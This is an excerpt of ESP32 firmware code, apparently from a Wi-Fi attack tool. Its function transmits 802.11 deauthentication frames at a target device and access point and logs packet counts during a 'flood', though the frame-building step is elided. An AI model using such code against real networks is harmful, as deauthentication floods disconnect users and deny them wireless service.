...
static void sendDeauth(const uint8_t target[6], const uint8_t bssid[6]) {
    ...
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);

    // Log diagnostics: first 5 calls only to avoid serial flooding
    if (_txLogCount < 5) {
        Serial.printf("[DEAUTH_TX] #%lu  ret=%s\n", _txLogCount, esp_err_to_name(ret));
        Serial.printf("[DEAUTH_TX] Frame[0..3]: %02X %02X %02X %02X\n",
            deauthFrame[0], deauthFrame[1], deauthFrame[2], deauthFrame[3]);
        Serial.printf("[DEAUTH_TX] Dst: %02X:%02X:%02X:%02X:%02X:%02X\n",
            deauthFrame[4],  deauthFrame[5],  deauthFrame[6],
            deauthFrame[7],  deauthFrame[8],  deauthFrame[9]);
        Serial.printf("[DEAUTH_TX] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
            deauthFrame[10], deauthFrame[11], deauthFrame[12],
            deauthFrame[13], deauthFrame[14], deauthFrame[15]);
    }
    // Periodic status every 500 packets after initial flood guard
    if (_txLogCount >= 5 && (_txLogCount % 500 == 0)) {
        Serial.printf("[DEAUTH_TX] Milestone: %lu packets sent, last ret=%s heap=%lu\n",
            _txLogCount, esp_err_to_name(ret), esp_get_free_heap_size());
    }
    _txLogCount++;

    if (ret == ESP_OK) deauthPackets++;
}
